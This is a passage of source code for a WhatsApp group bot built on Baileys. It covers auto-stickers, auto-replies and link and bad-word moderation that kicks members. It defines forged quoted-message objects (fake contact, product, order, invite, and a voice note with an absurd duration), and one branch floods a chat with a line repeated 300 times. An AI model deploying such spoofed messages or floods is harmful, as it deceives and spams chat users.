
require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const fetch = require('node-fetch')
const os = require('os')
const maker = require('mumaker')
const hx = require("hxz-api")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const xeonkey = require('xfarr-api')
const cheerio = require ("cheerio")
const { XeonBotIncTiktok } = require('./lib/tiktokbyxeon')
let { msgFilter } = require('./lib/antispam')
let { covid } = require('./lib/covid.js') 
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const { XeonBotIncWiki } = require('./lib/xeonywiki.js')
const textpro = require('./lib/textpro')
const { mediafireDl } = require('./lib/mediafire.js')
const { Gempa } = require("./lib/gempa.js")
const { jadwaltv }= require('./lib/jadwaltv')
const xeontod = require("tod-api")
const { pinterest } = require("./lib/pinterest")
const toHur = require('@develoka/angka-terbilang-js')
const { hentai } = require('./lib/scraper2.js')
const {
 FajarNews, 
 BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KoXeonBotIncSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme, 
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api")
//rpg function\\
   const { 
     addInventoriDarah, 
      cekDuluJoinAdaApaKagaDiJson, 
      addDarah, 
      kurangDarah, 
     getDarah 
   }  = require('./storage/user/darah.js')
   const { 
     cekInventoryAdaAtauGak, 
      addInventori,  
       addBesi, 
       addEmas, 
       addEmerald,
       addUmpan,
       addPotion,
       kurangBesi, 
       kurangEmas, 
       kurangEmerald, 
       kurangUmpan,
       kurangPotion,
       getBesi, 
      getEmas, 
     getEmerald,
     getUmpan,
    getPotion
   } = require('./storage/user/alat_tukar.js')
   const { 
    addInventoriMonay, 
    cekDuluJoinAdaApaKagaMonaynyaDiJson, 
    addMonay, 
    kurangMonay, 
   getMonay 
   } = require('./storage/user/monay.js')
   const { 
    addInventoriLimit, 
    cekDuluJoinAdaApaKagaLimitnyaDiJson, 
    addLimit, 
    kurangLimit, 
    getLimit 
   } = require('./storage/user/limit.js')
   const { 
    cekDuluHasilBuruanNya, 
     addInventoriBuruan, 
     addIkan,
      addAyam, 
      addKelinci, 
      addDomba, 
      addSapi,
      addGajah,
      kurangIkan,
      kurangAyam, 
      kurangKelinci, 
      kurangDomba, 
      kurangSapi,
      kurangGajah,
      getIkan,
      getAyam, 
      getKelinci, 
      getDomba,
     getSapi,
    getGajah
   } = require('./storage/user/buruan.js')
   let DarahAwal =  global.rpg.darahawal
   const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)   
   const isCekDarah = getDarah(m.sender)
   const isUmpan = getUmpan(m.sender)
   const isPotion = getPotion(m.sender)
   const isIkan = getIkan(m.sender)
   const isAyam = getAyam(m.sender)
   const isKelinci = getKelinci(m.sender)
   const isDomba = getDomba(m.sender)
   const isSapi = getSapi(m.sender)
   const isGajah = getGajah(m.sender)
   const isMonay = getMonay(m.sender)
   const isLimit = getLimit(m.sender)
   const isBesi = getBesi(m.sender)
   const isEmas = getEmas(m.sender)
   const isEmerald = getEmerald(m.sender)
   const isInventory = cekInventoryAdaAtauGak(m.sender)
   const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
   const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
   const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
   const ikan = ['🐟','🐠','🐡']   

//rpg database\\
 let _limit = JSON.parse(fs.readFileSync('./storage/user/limit.json'));
 let _buruan = JSON.parse(fs.readFileSync('./storage/user/hasil_buruan.json'));
 let _darahOrg = JSON.parse(fs.readFileSync('./storage/user/darah.json'))

//Database omther\\
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'));
let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
//
let lolkey = global.lolhuman
//read database\\
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = global.prefa
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isMod = [botNumber, ...global.Mod].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const from = mek.key.remoteJid
	    const type = Object.keys(mek.message)[0]        
	    const content = JSON.stringify(mek.message)
	    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()

        //group\\
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const AntiLink = m.isGroup ? ntilink.includes(from) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const antiWame = m.isGroup ? ntwame.includes(from) : false
const antiToxic = m.isGroup ? nttoxic.includes(from) : false
const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const isAutoStick = _autostick.includes(from)
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const Autoreply = m.isGroup ? autorep.includes(from) : true
        const isBan = banUser.includes(m.sender)
        const isBanChat = m.isGroup ? banchat.includes(from) : false
autoreadsw = true
	    
        //member\\
        let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]
		
          try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
if (!('templateImage' in setting)) setting.templateImage = false
if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateDocument' in setting)) setting.templateDocument = true
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: false,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateDocument: true,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	
	// FAKE TEXT IMG
const textImg = (teks) => {
XeonBotInc.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./XeonMedia/image/wpmobile.png')}) 
}

//FAKE CONTACT
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `916909137213 -1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Click to chat\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
//FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": log0 //The picture
},
"title": `${global.ownername}`, 
"description": `${global.botname}`, 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": `${global.watermark}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
} 
//FAKEREPLY TROLI
const ftroli = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 1,
status: 1,
surface : 1,
message: `${global.ownername}`, //
orderTitle: `${global.botname}`,
thumbnail: log0, //Pic
sellerJid: '0@s.whatsapp.net'

}
}
}
//FAKEREPLY LOCATION
const flokasi = {
key : {
 participant : '0@s.whatsapp.net'
},
message: {
locationMessage: {
name: `${global.location}`,
jpegThumbnail: log0
}
}
}
//FAKEREPLY DOCUMENT
const fdocs = {
key : {
 participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `${global.botname}`, 
jpegThumbnail: log0
}
}
}
//FAKEREPLY VIDEO
const fvideo = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"videoMessage": { 
"title": `${global.botname}`,
"h": `${global.ownername}`,
'seconds': '30', 
'caption': `${global.watermark}`,
'jpegThumbnail': log0
}
}
}
//FAKEREPLY GROUPINVITE
const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "916909137213-1616169743@g.us",
"inviteCode": `${global.ownername}`,
"groupName": `${global.botname}`, 
"caption":`${global.watermark}`, 
'jpegThumbnail': log0
}
}
}
//FAKEREPLY GIF
const fgif = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":`${global.botname}`,
 "h": `${global.ownername}`,
 'seconds': "30", 
 'gifPlayback': 'true', 
 'caption': `${global.watermark}`,
 'jpegThumbnail': log0
}
}
} 
//FAKEREPLY TEXT WITH THUMBNAIL
const ftextt = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"extendedTextMessage": {
 "text":`${global.ownername}`,
"title": `${global.botname}`,
 'jpegThumbnail': log0
}
} 
}
//FAKEREPLY VN
const fvn = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "9999999999999999",
"ptt": "true"
}
} 
}
	
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        
        const replay = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
	
        //Public & Self\\
        if (!XeonBotInc.public) {
            if (!m.key.fromMe) return
        }

        //Push Message To Console && Auto Read\\
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	//reset limit every 12 hours\\
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Limit Reseted')
        }, {
            scheduled: true,
            timezone: "Asia/Kolkata"
        })
        
        //hitter
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/CheemsBot/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/CheemsBot${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
        
	//auto set bio\\
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await XeonBotInc.setStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	
	//antispam or auto react
//if (m.message && msgFilter.isFiltered(from)) {
//console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
//return XeonBotInc.sendMessage(from, { react: { text: `${global.themeemoji}`, key: m.key }})
//}
	
//auto read whatsapp status
if (autoreadsw) {
		if (from === 'status@broadcast') {
		XeonBotInc.chatRead(from)
	}
	}
/*//autoreader gc and pm
if (global.autoreadpmngc) {
if (command) {
await XeonBotInc.sendPresenceUpdate('composing', m.chat)
XeonBotInc.sendReadReceipt(from, m.sender, [m.key.id])}
}
  //autoread gc only
 if (global.autoReadGc) {
  if (m.isGroup) { XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
}*/
  //auto recording all
    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
}
//auto available all
  if (global.available) { if (m.chat) { XeonBotInc.sendPresenceUpdate('available', m.chat) }
  }

// Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        //Autosticker pc
                if (isAutoStick) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

	// AntiLinkgc
if (AntiLink) {
linkgce = await XeonBotInc.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
  // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  reply(`Somebody spammed virus!! Mark as read⚠️\n`.repeat(300))
  reply(`\`\`\`「 Virus Detected 」\`\`\`\n\nSorry You Will Be Kicked !`)
  if (!isBotAdmins) return reply(mess.botAdmin)
  XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await XeonBotInc.groupParticipantsUpdate(m.chat, [kice], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

                //auto reply by xeon
  //if (Autoreply) //remove forwad slashes to make it autoreply on off
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

      //Mute Chat\\
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
        
        //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        
        //Respon Cmd with media\\
